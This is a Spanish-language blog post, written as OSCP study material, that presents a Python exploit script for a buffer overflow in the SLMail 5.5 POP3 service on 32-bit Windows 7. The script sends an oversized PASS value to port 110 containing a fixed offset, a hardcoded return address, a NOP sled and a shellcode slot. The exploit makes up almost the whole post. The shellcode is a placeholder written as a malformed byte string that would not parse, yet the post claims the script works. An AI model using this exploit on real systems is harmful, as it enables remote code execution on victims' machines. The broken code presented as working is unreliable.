---
layout: single
title: Buffer OverFlow a SLMail 5.5
excerpt: "En esta publicacion detallo mi practica a un Buffer OverFlow usando Python3 para la ejecucion remota de comandos RCE a bajo nivel, y persistencia en un sistema Windows 7 de 32 bits."
date: 2023-07-28
classes: wide
header:
  teaser: /assets/images/BOF-SLMail/BOFF.png
  teaser_home_page: true
categories:
  - BOF
  - Scripts
tags:
  - Python
  - Scripting
  - Windows 7
  - Buffer Overflow
---
## Buffer OverFlow al Binario SLMail 5.5 

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/BOFF.png" alt="bof" width="2000" oncontextmenu="return false;">
</div>

## Codigo del Script

Bof a Slmail 5.5

> El script esta hecho en python3


```python
#!/usr/bin/python
# Autor Liandd
from pwn import *
from struct import pack
import socket, sys

def exploit(ip_address, rport):
    # Escapar el shellcode con b para indicar que son bytes
    shellcode= (
        b"\ejemplo\"
    )

    buffer = b"A" * 2606 + pack("<L", 0x5f4a358f) + b"\x90"*16 + shellcode
    
    p1 = log.progress("Data")
    try:
        p1.status("Enviando %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)
        s.send(b'USER eva\r\n')
        s.recv(1024)
        s.send(b'PASS ' + buffer + b'\r\n')
        s.recv(1024)
    except Exception as e:
        print("\n[!] Ha habido un error de conexión:", e)
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
        sys.exit(0)

    ip_address = sys.argv[1]
    rport = 110

    exploit(ip_address, rport)
```

El Script es compilado y funciona correctamente:

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/BOFF.png" alt="resultbof" width="2000" oncontextmenu="return false;">
</div>
---

Esta publicacion ha sido creada como soporte en el aprendizaje de BufferOverFlow para la OSCP

Lian